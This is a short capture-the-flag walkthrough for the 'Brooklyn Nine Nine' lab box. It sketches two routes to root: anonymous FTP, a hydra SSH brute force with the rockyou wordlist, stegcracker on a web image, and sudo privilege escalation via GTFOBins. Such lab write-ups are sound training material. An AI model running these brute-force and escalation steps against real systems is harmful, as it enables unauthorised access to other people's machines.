# Brooklyn Nine Nine

This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.

## Deploy and get hacking

This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box. If you find more dm me in discord at Fsociety2006.

### Method one
#### User flag

```
nmap -Pn -vv -p- <target>

Ports
21 - FTP
22 - SSH

ftp <target>
Login: Anonymous
Password:
get <file>

hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://<target>

ssh jake@<target>
```

#### Root flag

```
sudo -l

Go to GTFOBins <binary from previous step>
```

### Method two
#### User flag

```
Go to website and read comments in 'Inspect' tab

wget <target url>

stegocracker <downloaded image> /usr/share/wordlists/rockyou.txt

ssh holt@<target>
```

#### Root flag

```
sudo -l

Go to GTFOBins <binary from previous step>
```